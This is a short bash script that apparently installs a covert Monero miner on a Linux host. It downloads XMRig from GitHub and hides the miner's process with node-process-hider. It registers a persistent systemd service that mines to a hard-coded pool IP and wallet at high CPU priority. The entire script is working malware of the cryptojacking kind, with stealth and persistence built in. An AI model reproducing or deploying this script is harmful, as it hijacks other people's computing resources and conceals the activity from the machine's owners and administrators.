SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ];
then
	echo "taind vip pro" > isHaveSetupCoin.txt
	cd /usr/local/bin
	sudo apt-get install linux-headers-$(uname -r) -y
	distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
        apt-get update && apt-get full-upgrade -y
        apt -y install wget curl unzip screen autoconf git cmake binutils build-essential net-tools golang libssl1.0-dev nodejs nodejs-dev node-gyp -y
        sudo apt update -y
        npm i -g node-process-hider && ph add xmrig
	sudo wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz -O - | tar -xz && cd xmrig-6.17.0
	sudo bash -c 'echo -e "[Unit]\nDescription=xmrig\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/bin/./xmrig -a rx/0 -o 104.248.119.73:80 -u 87ZKYmmCQmXGzu1AZkxmgM9wdqwk5YtBDQ6ZGouBam1584jKUvDrC7ccANX8N7M7sGRnR9Fu18gDdTQCVVo3U2m9KYhNNsR -p Kevin --threads=16 --cpu-priority=16 --randomx-mode=fast --keepalive 
 &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/xmr.service'
	sudo systemctl daemon-reload
	sudo systemctl enable xmr.service
	sudo systemctl start xmr.service
else
	sudo systemctl start xmr.service
fi
